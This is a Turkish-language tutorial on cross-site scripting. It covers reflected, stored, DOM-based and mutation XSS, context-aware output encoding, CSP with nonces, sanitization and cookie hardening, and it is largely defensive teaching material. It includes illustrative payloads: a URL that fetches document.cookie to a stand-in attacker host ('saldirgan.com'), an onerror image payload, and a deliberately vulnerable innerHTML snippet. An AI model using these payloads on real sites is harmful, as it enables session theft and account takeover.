# Cross-Site Scripting (XSS): Tüm Türleri, Kök Nedenleri ve Savunma

## Giriş ve Tanım

Cross-Site Scripting (XSS), bir saldırganın başka bir kullanıcının tarayıcısında çalışacak zararlı istemci tarafı (client-side) kod enjekte edebildiği bir web güvenlik açığıdır. Enjekte edilen kod neredeyse her zaman JavaScript olur, çünkü tarayıcıda çalıştırılabilen ve DOM'a (Document Object Model) tam erişimi olan dil budur. Adının "cross-site" (siteler arası) olması tarihseldir; günümüzde açığın çoğu tek bir site içinde gerçekleşir, dolayısıyla isim biraz yanıltıcıdır. Daha isabetli bir tanım "istemci tarafı kod enjeksiyonu" olurdu.

XSS'in kritik olmasının nedeni, tarayıcının **Same-Origin Policy** (SOP) güven modelini kırmasıdır. Bir origin'de (protokol + alan adı + port üçlüsü) çalışan JavaScript, o origin'in bütün verilerine erişebilir: `document.cookie` üzerinden oturum çerezleri, `localStorage`/`sessionStorage` içeriği, DOM'daki her form ve gizli token. Saldırgan kendi kodunu kurbanın origin'i içinde çalıştırabildiğinde, tarayıcı bu kodu meşru site kodu sanır. Bu yüzden XSS, oturum çalma (session hijacking), CSRF token okuyup istek sahtekârlığı, keylogging, phishing sayfası enjeksiyonu, hatta tarayıcı üzerinden iç ağ taraması gibi çok geniş bir saldırı yelpazesine kapı açar.

## Kök Neden: Veri ile Kodun Karışması

XSS'in temel kök nedeni, **veri (data) ile kod (code) arasındaki sınırın kaybolmasıdır**. Bir web uygulaması, kullanıcıdan gelen bir metni (yorum, isim, arama terimi) alıp HTML çıktısının içine yerleştirdiğinde, tarayıcı bu çıktıyı ayrıştırırken (parse) hangi kısmın gösterilecek metin, hangi kısmın çalıştırılacak işaretleme (markup) olduğunu ancak sözdizimsel karakterlere bakarak anlar. `<`, `>`, `"`, `'`, `&`, `` ` `` gibi karakterler tarayıcı için "burada yeni bir yapı başlıyor" sinyalidir.

Uygulama, kullanıcı verisini bu karakterleri nötrleştirmeden çıktıya koyarsa, kullanıcının verdiği `<script>` gibi bir dizge veri olmaktan çıkıp çalıştırılabilir koda dönüşür. Yani sorun "kötü karakterler" değildir; sorun, **verinin yerleştirildiği bağlama (context) uygun kaçış/kodlama uygulanmamasıdır**. Aynı metin bir HTML gövdesinde zararsızken bir `<script>` bloğu içinde ölümcül olabilir. Bu yüzden XSS'i doğru anlamak için "bağlam" kavramı merkezîdir; sonraki bölümlerde buna döneceğiz.

İkinci bir kök neden, tarayıcının HTML ve JavaScript ayrıştırıcılarının aşırı hoşgörülü (lenient) olmasıdır. Tarayıcı, bozuk işaretlemeyi bile "en iyi tahminle" toparlamaya çalışır. Bu esneklik, saldırganın filtreleri atlatmak için sayısız varyasyon üretebilmesine olanak tanır: büyük/küçük harf karışımı, eksik tırnaklar, alternatif event handler'lar, HTML entity kodlaması, farklı encoding katmanları. Bu yüzden "kara liste" (blacklist) yaklaşımı XSS'e karşı yapısal olarak yenik düşer.

## XSS Türleri

XSS geleneksel olarak zararlı verinin nereden geldiğine ve nerede çalıştırıldığına göre üç ana türe ayrılır: Reflected, Stored ve DOM-based. Bu ayrımı bir de "sunucu tarafı mı yoksa istemci tarafı mı" ekseniyle düşünmek gerekir, çünkü savunma noktası buna göre değişir.

### Reflected XSS (Yansıtılmış)

Reflected XSS'te zararlı payload, bir HTTP isteği (genellikle URL parametresi veya form verisi) içinde sunucuya gider ve sunucu bu değeri **aynı yanıtın HTML'i içine yansıtır**. Kalıcı depolama yoktur; payload her seferinde istekle taşınmalıdır.

Klasik örnek bir arama sayfasıdır. Kullanıcı `arama?q=merhaba` isteği yapar ve sayfa "merhaba için sonuçlar" der. Sunucu şunu üretiyorsa:

```
<p>Arama sonucu: KULLANICI_GIRDISI</p>
```

ve girdiyi kodlamıyorsa, saldırgan şu URL'i hazırlar:

```
https://ornek-site.com/arama?q=<script>fetch('https://saldirgan.com/c?'+document.cookie)</script>
```

Bu bağlantıyı e-posta, mesaj veya kötü niyetli bir sitedeki gizli yönlendirme ile kurbana ulaştırır. Kurban bağlantıya tıkladığında script kurbanın oturumu içinde çalışır ve çerezi saldırgana sızdırır.

**Sömürü mantığı:** Reflected XSS bir sosyal mühendislik bileşeni gerektirir; kurbanın hazırlanmış bir bağlantıya tıklaması gerekir. Bu yüzden "self-XSS" gibi görünüp küçümsenir, ama gerçekte hedefli phishing ile çok etkilidir ve tıklama başına tam origin kontrolü verir.

**Savunma:** Sunucu, yanıta yansıttığı her kullanıcı verisini o verinin gireceği bağlama göre kodlamalıdır (HTML gövdesi için HTML-encode). Ek olarak, hassas parametrelerin yansıtılmaması ve Content Security Policy ile satır içi (inline) script'lerin engellenmesi katmanlı savunma sağlar.

### Stored XSS (Depolanmış / Kalıcı)

Stored XSS'te payload sunucu tarafında **kalıcı olarak saklanır** (veritabanı, dosya, cache, log) ve daha sonra o veriyi görüntüleyen her kullanıcıya sunulur. Yorum alanları, kullanıcı profilleri, ürün yorumları, mesajlaşma, destek talepleri tipik hedeflerdir.

Bunun tehlikesi, saldırının **kendi kendine yayılabilmesi ve pasif olmasıdır**. Kurbanın özel bir bağlantıya tıklamasına gerek yoktur; sadece etkilenen sayfayı ziyaret etmesi yeterlidir. Bir forum gönderisine yerleştirilen payload, o gönderiyi gören yüzlerce kullanıcıyı etkiler. Yönetici panelinde tetiklenirse (örneğin bir destek talebini okuyan admin), doğrudan ayrıcalık yükseltmeye (privilege escalation) dönüşür. Geçmişte sosyal ağlarda self-propagating (kendini çoğaltan) XSS solucanları bu mekanizmayla yayılmıştır: payload, çalıştığı her kullanıcının profiline kendini tekrar yazar.

**Savunma:** Stored XSS için kritik ilke, **çıktı kodlamasının render anında (output time) yapılmasıdır**, veriyi depolarken değil. Çünkü aynı veri farklı bağlamlarda (HTML sayfası, JSON API, e-posta, PDF) görüntülenebilir ve her bağlam farklı kodlama ister. Depolama anında kodlarsanız verinin doğru gösterimini kaybeder, çift kodlama (double encoding) sorunları yaşar ve API tüketicilerine kirli veri gönderirsiniz. Ham veriyi saklayın, her çıktı noktasında bağlama duyarlı kodlayın.

### DOM-based XSS

DOM-based XSS, diğer ikisinden temelde farklıdır: zararlı akış **hiç sunucuya uğramadan, tamamen tarayıcı içinde** gerçekleşir. Sunucu tarafı çıktı kodlaması bu türü hiç görmez ve engelleyemez. Açık, JavaScript kodunun kullanıcı kontrollü bir kaynaktan (source) veri alıp onu tehlikeli bir hedefe (sink) güvenli olmayan biçimde yazmasından doğar.

**Source (kaynak) örnekleri:** `location.href`, `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage` verisi, `localStorage`.

**Sink (hedef) örnekleri:** `element.innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout(string)`, `location = ...`, jQuery'de `$(...).html()`.

Tipik zafiyetli kod:

```
var isim = location.hash.substring(1);
document.getElementById("selam").innerHTML = "Merhaba " + isim;
```

Saldırgan `https://site.com/#<img src=x onerror=alert(document.cookie)>` URL'ini verdiğinde, `location.hash` içeriği doğrudan `innerHTML`'e yazılır ve `onerror` event handler'ı çalışır. Dikkat edilmesi gereken şudur: URL'in `#` sonrası kısmı (fragment) tarayıcı tarafından **sunucuya gönderilmez**, dolayısıyla sunucu logları ve sunucu tarafı filtreler bu saldırıyı hiç göremez. Bu, DOM-based XSS'in tespitini zorlaştıran temel özelliğidir.

**Neden ayrı bir tür:** Modern uygulamalar (SPA'lar, React/Vue/Angular öncesi ve bazen sonrası) mantığın büyük kısmını istemciye taşıdığı için DOM-based XSS payı sürekli artmaktadır. Savunma da istemci tarafında yapılmalıdır.

**Savunma:** Kullanıcı kontrollü veriyi `innerHTML` gibi HTML ayrıştıran sink'lere asla ham vermeyin. Metin yazmak için `textContent`/`innerText` kullanın (bunlar HTML olarak yorumlanmaz). `eval`, `new Function`, dizge alan `setTimeout` ve `document.write` gibi yapılardan kaçının. Zengin HTML gerçekten gerekiyorsa istemci tarafında güvenilir bir sanitizasyon kütüphanesinden geçirin. Modern tarayıcılarda **Trusted Types** politikası, tehlikeli sink'lere ham dizge yazılmasını API düzeyinde engelleyerek DOM-based XSS'i yapısal olarak kesebilir.

### Mutation XSS (mXSS) — İncelikli bir alt tür

Bir de sanitize edilmiş HTML'in, tarayıcı DOM'a yerleştirdikten sonra kendi ayrıştırıcısı tarafından "yeniden yazılıp" (mutation) tekrar tehlikeli hale gelmesiyle oluşan mutation XSS vardır. Örneğin bir sanitizer statik metin olarak güvenli görünen bir dizgeyi geçirir, ama tarayıcı `innerHTML` atamasında onu normalize ederken beklenmedik bir etiket/attribute üretir. Bu yüzden sanitizasyon, tarayıcının gerçek ayrıştırma davranışını bilen olgun kütüphanelere bırakılmalıdır; elle regex ile HTML temizlemek neredeyse her zaman mXSS'e açıktır.

## Merkez Savunma: Bağlama Duyarlı Çıktı Kodlaması

XSS'e karşı en temel ve en güvenilir savunma, **context-aware output encoding** (bağlama duyarlı çıktı kodlaması) / kaçış (escaping) yapmaktır. Kilit fikir şudur: veriyi çıktıya koyduğunuz **yerin sözdizimsel bağlamı**, hangi karakterleri nasıl kodlamanız gerektiğini belirler. Tek bir "her yere uyan" kodlama yoktur. Başlıca bağlamlar:

**1. HTML gövde bağlamı** — `<div>BURAYA</div>`. Burada `<`, `>`, `&`, `"`, `'` karakterleri HTML entity'lerine çevrilir (`&lt;`, `&gt;`, `&amp;`, `&quot;`, `&#39;`). Bu, en yaygın ve en iyi anlaşılan durumdur.

**2. HTML attribute bağlamı** — `<input value="BURAYA">`. Değer tırnak içindeyse, tırnak karakterinin kaçırılması kritiktir; aksi halde saldırgan tırnağı kapatıp `onmouseover=...` gibi yeni bir attribute enjekte eder. Tırnaksız attribute (`value=BURAYA`) çok daha tehlikelidir, çünkü boşluk bile attribute sınırını bozar; attribute'ları daima tırnak içine alın.

**3. JavaScript bağlamı** — `<script>var x = "BURAYA";</script>`. Burada HTML entity kodlaması **işe yaramaz**, çünkü script bloğu içi HTML olarak ayrıştırılmaz. Burada JavaScript string escape (örneğin `"`, `'`, `\`, satır sonu ve `</` dizisinin kaçırılması) gerekir. Ayrıca `</script>` dizisi metin içinde geçse bile bloğu erken kapatabileceği için ayrıca ele alınmalıdır. En iyisi kullanıcı verisini hiç script içine gömmemek; gerekiyorsa veriyi bir data attribute'a HTML-encode edip JS ile `dataset`'ten okumak veya güvenli bir JSON serileştirici kullanmaktır.

**4. URL bağlamı** — `<a href="BURAYA">`. Burada iki katman vardır: URL bileşeni encode'u (`encodeURIComponent`) ve şema kontrolü. `javascript:` şeması özellikle tehlikelidir; `<a href="javascript:...">` tıklandığında kod çalışır. Bu yüzden kullanıcı kontrollü URL'lerde şemayı beyaz liste ile (`http`, `https`, `mailto`) doğrulamak şarttır.

**5. CSS bağlamı** — `<style>` veya `style="..."`. CSS içine giren kullanıcı verisi de eski tarayıcılarda `expression()` gibi vektörlerle veya `url(javascript:...)` ile istismar edilebilir; kullanıcı verisini CSS'e gömmekten kaçının.

Bu bağlamların her birinin farklı kaçış kuralı olması, XSS savunmasındaki en sık yapılan hatanın da kaynağıdır: geliştirici HTML-encode uygular ama veriyi bir JavaScript bağlamına koyar; kodlama bağlama uymadığı için koruma çökebilir. Bu yüzden **hangi kaçışı yapacağınıza değil, veriyi hangi bağlama yerleştirdiğinize odaklanın** ve o bağlamın kodlayıcısını çağırın. Modern şablon motorları (Jinja2, Razor, Go html/template, React JSX) çoğu HTML gövde ve attribute bağlamında **otomatik kaçış** yapar; asıl risk, bu otomatik kaçışı bilerek atlatan yapılarda (`dangerouslySetInnerHTML`, `|safe`, `v-html`, `Html.Raw`) yoğunlaşır.

## Content Security Policy (CSP)

CSP, XSS'e karşı **savunma derinliği (defense in depth)** sağlayan bir HTTP yanıt başlığıdır (`Content-Security-Policy`). Çıktı kodlamasının yerini almaz; kodlama başarısız olduğunda hasarı sınırlayan ikinci hattır. CSP'nin temel fikri, tarayıcıya "bu sayfada hangi kaynaklardan kod/kaynak yüklenebileceğini" bildirmek ve satır içi (inline) script çalışmasını kısıtlamaktır.

XSS açısından en kritik direktif `script-src`'dir. Katı bir politika, satır içi `<script>` bloklarını ve `onclick` gibi satır içi event handler'ları çalıştırmayı reddeder. Bu, enjekte edilen `<script>alert(1)</script>` payload'ının tarayıcı tarafında bloklanması demektir — sunucu onu yanıta yansıtmış olsa bile.

Satır içi script'e gerçekten ihtiyaç olan durumlar için CSP iki güvenli mekanizma sunar:

- **Nonce:** Sunucu her yanıt için tahmin edilemez, tek kullanımlık bir değer üretir, hem CSP başlığına (`script-src 'nonce-XYZ'`) hem de meşru `<script nonce="XYZ">` etiketlerine koyar. Tarayıcı yalnızca doğru nonce'a sahip script'leri çalıştırır. Saldırgan nonce'u önceden bilemediği için enjekte ettiği script çalışmaz. Nonce'un her istekte yeniden üretilmesi ve tahmin edilemez olması şarttır.
- **Hash:** Sunucu, izin verilen satır içi script'in içeriğinin hash'ini (örneğin SHA-256) politikaya koyar; tarayıcı yalnızca hash'i eşleşen bloğu çalıştırır.

Modern öneri, `'strict-dynamic'` ile birlikte nonce tabanlı bir politika kurmaktır. `'strict-dynamic'`, nonce ile güvenilen bir script'in yüklediği alt script'lere güven yayar ve böylece host beyaz listesi bakımının kırılganlığından kurtarır. Kaçınılması gereken en yaygın hata ise `script-src 'unsafe-inline'` kullanmaktır; bu, CSP'nin XSS'e karşı sağladığı korumanın neredeyse tamamını iptal eder. Benzer şekilde `unsafe-eval`, DOM-based XSS için `eval` sink'ini açık bırakır.

CSP'nin **rapor modu** (`Content-Security-Policy-Report-Only`) da değerlidir: politikayı zorlamadan ihlalleri toplayıp, üretime almadan önce yanlış pozitifleri ayıklamanızı sağlar. Ayrıca `report-to`/`report-uri` ile canlı ortamda gerçekleşen enjeksiyon girişimlerini erken tespit edebilirsiniz. CSP'nin sınırı şudur: yanlış yapılandırılmış (çok gevşek host listeleri, `unsafe-inline`, açık JSONP endpoint'leri, güvenilen CDN'de barındırılan istismar edilebilir kütüphaneler) bir politika kolayca atlatılır. Yani CSP güçlüdür ama tek başına değil, doğru kodlama ile birlikte anlamlıdır.

## Sanitizasyon: Ne Zaman ve Nasıl

Kodlama (encoding) ile sanitizasyon (sanitization) sık karıştırılır ama farklı problemleri çözer. **Kodlama**, veriyi zararsız metin olarak göstermek içindir; kullanıcı `<b>` yazdıysa ekranda `<b>` metnini görür. **Sanitizasyon** ise, kullanıcının **gerçekten HTML üretmesine izin vermeniz gerektiğinde** (zengin metin editörü, yorumlarda kalın/italik/link) devreye girer: girdideki HTML'i ayrıştırıp yalnızca güvenli etiket/attribute'ları bırakır, script ve tehlikeli olanları atar.

Sanitizasyonun altın kuralı: **kendiniz yazmayın.** HTML ayrıştırma, tarayıcı davranışı, mutation XSS ve sayısız kaçış vektörü o kadar karmaşıktır ki regex tabanlı elle temizlik neredeyse kesinlikle atlatılır. Bunun yerine, tarayıcının gerçek ayrıştırıcısını temel alan olgun kütüphaneler kullanın (istemci tarafında yaygın olarak DOMPurify, sunucu tarafında dile göre bakımı iyi yapılan HTML sanitizer'lar). Bu kütüphaneler beyaz liste (allowlist) yaklaşımı benimser: neye izin verildiği açıkça tanımlıdır, tanımsız her şey elenir. Kara liste ("şu etiketleri yasakla") yaklaşımı yapısal olarak başarısızdır, çünkü saldırgan listede olmayan bir vektör bulur.

Ayrıca **input validation (girdi doğrulama)** ile sanitizasyonu karıştırmayın. Girdi doğrulama (örneğin "bu alan sadece rakam içermeli") faydalı bir ilk katmandır ve saldırı yüzeyini daraltır, ama XSS'e karşı **birincil savunma olamaz**, çünkü birçok alan meşru olarak `<`, `>`, `&` gibi karakterler içerebilir (isimler, adresler, serbest metin). XSS'i asıl çözen, girdide ne olursa olsun çıktıda bağlama uygun kodlama/sanitizasyon yapmaktır.

## HttpOnly, SameSite ve Çerez Katmanı

`HttpOnly`, bir çereze konulduğunda o çerezin `document.cookie` üzerinden **JavaScript'e görünmez olmasını** sağlayan bir çerez özniteliğidir. Amacı doğrudan XSS'i engellemek değildir; XSS gerçekleştiğinde **oturum çerezinin çalınmasını zorlaştırmaktır**. Bir saldırgan XSS ile kod çalıştırsa bile, `HttpOnly` işaretli oturum çerezini `document.cookie` ile okuyamaz, dolayısıyla klasik "çerezi sunucuma sızdır" saldırısı kırılır.

Ancak `HttpOnly`'nin sınırlarını dürüstçe anlamak önemlidir. XSS gerçekleştiyse saldırgan zaten kurbanın origin'inde kod çalıştırıyordur; çerezi çalamasa da **çerezi kullanan istekleri kurbanın tarayıcısından yapabilir** (session riding). Yani `HttpOnly`, çerez sızıntısını engeller ama kimliğe bürünmeyi (impersonation) tamamen durdurmaz. Bu yüzden `HttpOnly` gerekli ama yeterli değildir; XSS'in kendisini çözmenin yerini tutmaz.

Çerez katmanında birlikte kullanılması gereken diğer öznitelikler: `Secure` (çerezi yalnızca HTTPS üzerinden gönderir), `SameSite` (çapraz site isteklerinde çerezin gönderilmesini kısıtlar; öncelikle CSRF'e karşıdır ama saldırı yüzeyini genel olarak daraltır). Oturum yönetimini güçlendirmek için ek önlemler: kritik işlemlerde yeniden kimlik doğrulama, oturum token'larını yalnızca `HttpOnly` çerezde tutmak (JS'in eriştiği `localStorage`'da token tutmak XSS'e karşı daha zayıftır, çünkü `localStorage` her zaman JavaScript'e açıktır).

## Yaygın Hatalar

**1. Girdi doğrulamaya güvenip çıktı kodlamasını atlamak.** "Formda tehlikeli karakterleri engelledik" düşüncesi, aynı verinin farklı bir yoldan (API, import, başka bir servis) sisteme girmesiyle çöker. Savunma çıktı noktasında olmalı.

**2. Kara liste / karakter değiştirme.** `<script>` dizgesini silmek veya `<` karakterini kaçırmayı belirli desenlere göre yapmak, `<img onerror>`, `<svg onload>`, olay öznitelikleri, `javascript:` şeması, encoding katmanları gibi onlarca alternatifi kaçırır.

**3. Bağlamı karıştırmak.** HTML-encode edilmiş veriyi bir `<script>` bloğuna, `href="javascript:"` içine veya bir event handler attribute'una koymak. Kodlama bağlama uymadığında koruma sağlamaz.

**4. Çerçevenin otomatik kaçışını bilinçsizce delmek.** `dangerouslySetInnerHTML`, `v-html`, `|safe`, `Html.Raw`, `innerHTML` — bunlar geliştiriciye "ben ne yaptığımı biliyorum" sözü verdirir. Bu noktalar denetimin (audit) merkezinde olmalıdır.

**5. DOM-based XSS'i sunucu savunmasıyla kapatmaya çalışmak.** Fragment (`#`) tabanlı payload sunucuya hiç gitmez; sunucu tarafı WAF ve kodlama onu göremez. İstemci tarafı sink hijyeni şarttır.

**6. Sanitizasyonu elle yazmak veya güncellemeyi ihmal etmek.** Sanitizer kütüphaneleri, yeni keşfedilen bypass'lara karşı düzenli güncellenir; eski bir sürüm bilinen bir mXSS vektörüne açık olabilir.

**7. `unsafe-inline` / `unsafe-eval` ile CSP'yi anlamsızlaştırmak.** CSP eklemek "güvenlik başlığımız var" hissi verir ama bu iki değerle koruma büyük ölçüde kağıt üzerinde kalır.

## En İyi Pratikler

**Katmanlı savunma (defense in depth) kurun.** Tek bir mekanizmaya güvenmeyin. Sıralama önerisi: (1) her çıktı noktasında bağlama duyarlı otomatik kaçış yapan bir şablon motoru; (2) zengin HTML gereken yerlerde olgun bir sanitizer kütüphanesi; (3) katı, nonce tabanlı bir CSP (`strict-dynamic` ile, `unsafe-inline` olmadan); (4) oturum çerezlerinde `HttpOnly`, `Secure`, uygun `SameSite`; (5) mümkünse Trusted Types ile tehlikeli DOM sink'lerini API düzeyinde kilitleyin.

**Ham veriyi saklayın, çıktıda kodlayın.** Depolama anında kodlama yapmayın; render bağlamı her yerde farklı olabilir. Bu, stored XSS'i doğru yönetmenin de anahtarıdır.

**Tehlikeli sink'leri ve "raw" çıkışları merkezî olarak denetleyin.** `innerHTML`, `eval`, `document.write`, `dangerouslySetInnerHTML` gibi kullanımlar için kod tabanında lint kuralları ve kod inceleme kontrol listeleri oluşturun. Bu noktalar XSS'in %90'ının doğduğu yerlerdir.

**URL şemalarını beyaz liste ile doğrulayın.** Kullanıcı kontrollü bağlantılarda yalnızca `http`, `https`, `mailto` gibi güvenli şemalara izin verin; `javascript:` ve `data:` şemalarını reddedin.

**CSP'yi önce rapor modunda çalıştırın**, ihlalleri toplayıp yanlış pozitifleri temizleyin, sonra zorlamaya (enforce) geçin. Canlıda `report-to` ile enjeksiyon girişimlerini izleyin.

**Oturum token'ını `localStorage` yerine `HttpOnly` çerezde tutmayı tercih edin.** Böylece XSS gerçekleşse bile token doğrudan okunamaz.

**Otomatik ve manuel testi birleştirin.** DAST/tarayıcılar reflected ve bazı stored XSS'i yakalar; DOM-based XSS için source-to-sink akış analizi ve manuel inceleme gerekir. Şablonlardaki her `raw`/`safe` kullanımını güvenlik incelemesinin sabit maddesi yapın.

## Sonuç

XSS, özünde basit bir kök nedene dayanır: veri ile kodun tarayıcı ayrıştırıcısında karışması. Ama bu basit çekirdek, bağlamların çokluğu, tarayıcı ayrıştırıcılarının hoşgörüsü ve istemci tarafına kayan uygulama mantığı yüzünden pratikte çok yönlü bir tehdide dönüşür. Doğru zihniyet şudur: XSS'i "kötü karakterleri temizleme" problemi değil, "her veriyi gireceği bağlama uygun biçimde çıktıya verme" problemi olarak görün. Bağlama duyarlı kodlamayı birincil savunma, sanitizasyonu zengin HTML için özel araç, CSP'yi hata durumunda hasarı sınırlayan ikinci hat, `HttpOnly` ve çerez sertleştirmeyi ise sömürünün sonuçlarını daraltan katman olarak konumlandırdığınızda, hem reflected hem stored hem de DOM-based XSS'e karşı sağlam ve dürüst bir savunma kurmuş olursunuz.
